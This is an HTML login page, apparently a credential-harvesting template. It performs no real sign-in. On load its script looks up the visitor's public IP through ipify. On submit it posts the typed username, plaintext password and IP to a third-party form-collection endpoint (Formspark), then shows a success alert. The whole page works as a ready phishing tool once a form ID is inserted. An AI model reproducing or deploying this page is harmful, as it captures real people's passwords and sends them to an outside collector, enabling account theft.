<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form with IP Address</title>
    <style>
        /* Simple styling */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
        }

        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        input {
            display: block;
            margin: 10px 0;
            padding: 8px;
            width: 100%;
        }

        button {
            padding: 10px 15px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login</h1>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <input type="hidden" id="ipAddress" name="ipAddress">
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        // Fetch IP address from an external API
        async function fetchIpAddress() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        // When the page loads, fetch the IP address and set it in the hidden input field
        window.onload = async function() {
            const ip = await fetchIpAddress();
            document.getElementById('ipAddress').value = ip;
        };

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent the default form submission

            // Collect form data
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const ipAddress = document.getElementById('ipAddress').value;

            // Prepare data for Formspark
            const formData = {
                username: username,
                password: password,
                ipAddress: ipAddress
            };

            try {
                // Send the data to Formspark
                const response = await fetch('https://submit.formspark.io/YOUR_FORM_ID', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(formData)
                });

                if (response.ok) {
                    alert('Form submitted successfully');
                } else {
                    alert('Failed to submit the form');
                }
            } catch (error) {
                console.error('Error submitting form:', error);
            }
        });
    </script>
</body>
</html>
